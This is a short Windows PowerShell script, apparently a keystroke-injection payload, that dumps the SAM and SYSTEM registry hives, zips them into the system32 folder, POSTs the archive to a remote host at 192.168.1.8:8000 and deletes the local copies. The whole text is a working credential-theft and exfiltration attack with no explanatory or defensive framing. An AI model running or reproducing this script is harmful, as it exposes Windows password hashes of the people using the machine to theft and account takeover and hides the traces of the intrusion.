reg save hklm\sam 1337OMGsam;
reg save hklm\system 1337OMGsys;
Compress-Archive -Path "$PWD\1337OMGsys", "$PWD\1337OMGsam" -DestinationPath "C:\WINDOWS\system32\OMGdump.zip" -Force;
$file = [IO.File]::ReadAllBytes("C:\WINDOWS\system32\OMGdump.zip");
iwr "http://192.168.1.8:8000" -Method POST -Body $file -UseBasicParsing;
remove-item 1337OMGsys;
remove-item 1337OMGsam;
exit
